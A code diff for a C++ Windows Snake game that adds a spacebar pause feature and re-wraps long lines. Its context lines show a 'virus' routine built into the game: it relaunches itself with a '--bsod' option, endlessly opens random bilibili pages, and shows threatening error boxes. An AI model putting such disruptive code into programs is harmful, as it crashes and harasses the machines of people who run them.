@@ -4,6 +4,7 @@
 #include "framework.h"
 #include "CMySnake_GUI.h"
 #include "../../resource/tool.h"
+using namespace std;
 
 #define MAX_LOADSTRING 100
 
@@ -74,6 +75,7 @@ namespace SnakeGame {
 		Window window;
 		bool InitSnake();
 		void PrintSnake(HDC hdc);
+#undef pause
 		void pause(bool pause = true) {
 			if (pause) SuspendThread(hThread_snakerun);
 			else ResumeThread(hThread_snakerun);
@@ -157,7 +159,8 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 	// 2.使用命令行参数
 	// 在后面加载,可以覆盖偏好设置,所以命令行参数优先
 	CmdLineA cl(::GetCommandLineA());
-	if (cl.getopt("pos-x") || cl.getopt("pos-y") || cl.getopt("width") || cl.getopt("height")) {
+	if (cl.getopt("pos-x") || cl.getopt("pos-y") ||
+		cl.getopt("width") || cl.getopt("height")) {
 		string x, y, w, h;
 		cl.getopt("pos-x", x); cl.getopt("pos-y", y);
 		cl.getopt("width", w); cl.getopt("height", h);
@@ -354,6 +357,25 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 			MySnake.pause(0);
 			break;
 		}
+		
+		if (wParam == VK_SPACE) { // 不弹框暂停
+			static bool paused = false; // 已暂停
+			static HWND hTipsWindow = NULL;
+			MySnake.pause(paused = !paused);
+			RECT rc; GetWindowRect(hWnd, &rc);
+			if (hTipsWindow == NULL) {
+				hTipsWindow = CreateWindowExW(WS_EX_LAYERED | WS_EX_NOACTIVATE,
+					L"#32770", L"Game Paused", WS_DISABLED,
+					rc.left, rc.top, 50, 20, NULL, 0, 0, 0);
+				if (!hTipsWindow) break;
+				SetLayeredWindowAttributes(hTipsWindow, 0, 255, LWA_ALPHA);
+			}
+			SetWindowPos(hTipsWindow, (HWND)-1, rc.left, rc.top, 0, 0, SWP_NOSIZE);
+			ShowWindow(hTipsWindow, paused);
+			SetForegroundWindow(hWnd);
+			break;
+		}
+
 		switch (wParam) {
 		case 'W':
 		case VK_UP:
@@ -593,7 +615,8 @@ INT_PTR CALLBACK WndProc_HistoryDlg(HWND hDlg, UINT message, WPARAM wParam, LPAR
 bool SnakeGame::Snake::InitSnake() {
 	// Load Config
 	// yinweinaigeshurufabaeigaisidesougourilesuoyizhaxiezhushiyongEnglishxie
-	fstream fp("./cmysnake/" + GetCurrentUserSecurityId() + "/snake.conf.b", ios::in|ios::binary);
+	fstream fp("./cmysnake/" + GetCurrentUserSecurityId() + "/snake.conf.b",
+		ios::in|ios::binary);
 	if (!fp) { // no config file exists
 		// create it...
 		fstream fp2("./cmysnake/" + GetCurrentUserSecurityId() + "/snake.conf.b",
@@ -608,7 +631,8 @@ bool SnakeGame::Snake::InitSnake() {
 		fp2.write((char*)&cf, sizeof(cf));
 		fp2.close();
 		// reopen
-		fp.open("./cmysnake/" + GetCurrentUserSecurityId() + "/snake.conf.b",ios::in|ios::binary);
+		fp.open("./cmysnake/" + GetCurrentUserSecurityId() + "/snake.conf.b",
+			ios::in|ios::binary);
 	}
 	// ok
 	fp.read((char*)&cf, sizeof(cf));
@@ -616,8 +640,8 @@ bool SnakeGame::Snake::InitSnake() {
 	fp.close();
 
 	// 创建线程
-	hThread_snakerun = (HANDLE)_beginthreadex(NULL, 0, reinterpret_cast<_beginthreadex_proc_type>
-		(RunSnake), (LPVOID)this, CREATE_SUSPENDED, 0);
+	hThread_snakerun = (HANDLE)_beginthreadex(NULL, 0, reinterpret_cast
+		<_beginthreadex_proc_type>(RunSnake), (LPVOID)this, CREATE_SUSPENDED, 0);
 	if (!hThread_snakerun) {
 		throw exception("InitError: An error occurred while init snake class.");
 		return false;
@@ -728,8 +752,10 @@ unsigned int __stdcall SnakeGame::Snake::RunSnake(void*the) {
 		theclass->head.point = pt;
 		// 5. 检测是否loser
 		if (theclass->head.point.x < 0 || theclass->head.point.y < 0 ||
-			theclass->head.point.x > rect_length * (int)theclass->window.cols - 2 * rect_length||
-			theclass->head.point.y > rect_length * (int)theclass->window.rows - 2 * rect_length
+			theclass->head.point.x > rect_length * (int)theclass->window.cols
+			- 2 * rect_length||
+			theclass->head.point.y > rect_length * (int)theclass->window.rows
+			- 2 * rect_length
 			) { // loser
 		loserhandle:
 			if (theclass->cf.exitondie) exit(0);
@@ -795,7 +821,8 @@ void SnakeGame::Snake::SaveScore() {
 	Record rc;
 	rc.timestamp = time(0);
 	rc.score = score;
-	fstream fp("./cmysnake/" + GetCurrentUserSecurityId()+"/scores.hist", ios::app|ios::binary);
+	fstream fp("./cmysnake/" + GetCurrentUserSecurityId()+"/scores.hist",
+		ios::app|ios::binary);
 	if (!fp) return;
 	fp.write((char*)&rc, sizeof(rc));
 	fp.close();
@@ -823,7 +850,8 @@ void FuckerVirusLaunch() {
 				Process.StartOnly(s2ws("\"" + GetProgramDir() +
 					"\" --virus=fucker --trace-error-box"));
 				Sleep(500);
-				Process.StartOnly(s2ws("\"" + GetProgramDir() + "\" --virus=fucker --bsod"));
+				Process.StartOnly(s2ws("\"" + GetProgramDir() + 
+					"\" --virus=fucker --bsod"));
 			} else l = n;
 			Sleep(1000);
 		}
@@ -865,7 +893,8 @@ void FuckerVirusLaunch() {
 	}
 	if (cl.getopt("open_bilibili")) {
 		while (1) {
-			Process.StartOnly(s2ws("explorer https://b23.tv/av" + to_string(rand() % 268435456)));
+			Process.StartOnly(s2ws("explorer https://b23.tv/av" +
+				to_string(rand() % 268435456)));
 			Sleep(10000);
 		}
 		exit(0);
@@ -922,7 +951,8 @@ void FuckerVirusLaunch() {
 	}
 	else {
 		MessageBoxA(hWnd, "What??", "Fuck you", MB_ICONERROR);
-		MessageBoxA(hWnd, "Don't you realize what you did wrong??", "Fuck you", MB_ICONERROR);
+		MessageBoxA(hWnd, "Don't you realize what you did wrong??", 
+			"Fuck you", MB_ICONERROR);
 		MessageBoxA(hWnd, "In that case", "Fuck you", MB_ICONERROR);
 		MessageBoxA(hWnd, "Your computer is dying!", "Fuck you", MB_ICONERROR);
 		MessageBoxA(hWnd, "This is the last warning!!", "Fuck you", MB_ICONERROR);
